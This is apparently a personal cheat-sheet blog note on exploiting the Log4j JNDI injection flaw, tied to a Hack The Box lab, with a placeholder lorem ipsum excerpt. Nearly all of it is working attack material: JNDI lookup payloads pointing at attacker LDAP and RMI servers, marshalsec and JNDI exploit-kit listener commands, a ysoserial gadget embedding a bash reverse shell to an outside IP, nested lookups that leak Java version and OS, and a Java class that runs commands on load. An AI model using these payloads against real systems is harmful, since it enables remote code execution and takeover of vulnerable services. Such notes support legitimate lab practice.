---
title: Log4j
date: 2022-01-01
categories:
  - Notes
tags:
  - Log4j
  - ysoserial
  - marshalsec

excerpt_separator: <!--more-->
---

<p>Lorem ipsum dolor sit amet,consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>


<!--more-->

# Log4j

- `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "https://c6c9-202-89-151-235.ngrok.io:8888/log4jrce"`
- `${jndi:ldap://10.10.14.2:1337/a}`
- [ysoserial-modified](https://github.com/pimps/ysoserial-modified)
   - `java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.6/9002 0>&1' > ~/htb/logforge/ysoserial.ser` **_Creates a serialized payload_**
- [JNDI-exploit-kit](https://github.com/pimps/JNDI-Exploit-Kit)
   - `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.6:1389 -P ~/htb/logforge/ysoserial.ser` **_Listens to port 1389 then sends ysoserial.ser_**
   - after running ysoserial-modified we will get links for different versions for jdk to try out. `${jndi:ldap://10.10.14.6:1389/vojbuj}`
- `${jndi:ldap://10.10.14.2:1337/${sys:java.class.path} or ${java:version} or ${java:os}}` **_or can be replaced with .... to do nested thingy_**
- Using JRMPListener to send CommonsCollections `java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsCollections5 "**_CMD_**"` **_this will set up a listener listening on port 1337. send your payload `${jndi:rmi://10.10.10.10:1337/a}` and should receive something.
```Java
public class Log4jRCE {
    static {
        try {
            String [] cmd={"touch", "/tmp/TEST"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

